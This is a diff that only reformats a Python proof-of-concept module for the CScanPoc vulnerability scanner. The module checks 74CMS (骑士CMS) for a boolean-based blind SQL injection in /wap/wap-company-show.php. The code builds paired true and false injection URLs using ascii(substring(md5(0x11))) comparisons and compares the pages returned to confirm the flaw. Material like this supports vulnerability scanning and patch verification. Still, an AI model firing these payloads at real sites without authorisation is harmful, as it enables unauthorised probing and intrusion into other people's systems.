@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = '74CMS_0004' # 平台漏洞编号，留空
+    vuln_id = '74CMS_0004'  # 平台漏洞编号，留空
     name = '骑士CMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-11-11'  # 漏洞公布时间
     desc = '''
         骑士CMS /wap/wap-company-show.php 参数未过滤完整，导致SQL注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '74CMS(骑士CMS)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '80aa152f-c75b-4f37-9cd7-1c6e742515c5'
@@ -31,14 +33,16 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer :http://www.wooyun.org/bugs/wooyun-2014-082539
+
+            # refer :http://www.wooyun.org/bugs/wooyun-2014-082539
             hh = hackhttp.hackhttp()
             arg = self.target
-            true_url = arg + '/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=52' #true
-            false_url = arg + '/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=53' #false
-            code1, head1, res1, errcode1,finalurl1 =  hh.http(true_url)
-            code2, head2, res2, errcode2,finalurl2 =  hh.http(false_url)
+            true_url = arg + \
+                '/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=52'  # true
+            false_url = arg + \
+                '/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=53'  # false
+            code1, head1, res1, errcode1, finalurl1 = hh.http(true_url)
+            code2, head2, res2, errcode2, finalurl2 = hh.http(false_url)
 
             if code1 == 200 and code2 == 200:
                 if res1.find('url="wap-jobs-show.php?id=1"') != -1 and res2.find('url="wap-jobs-show.php?id=1"') == -1:
@@ -51,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
